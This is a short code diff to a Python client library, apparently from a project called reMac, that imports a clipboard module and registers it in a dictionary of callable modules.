@@ -2,7 +2,12 @@ import json
 import os
 import base64
 from apps.libs.reMac_libbase import reMac_libbase
+from apps.client.modules.mod_client_clipboard import mod_client_clipboard
 
+reMacModules = {
+    #'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
+    'cb': [mod_client_clipboard(), 'clipboard', 'Call clipboard module', 'cb']
+}
 
 class reMac_libclient(reMac_libbase):
     def __init__(self, selector, sock, addr, request):
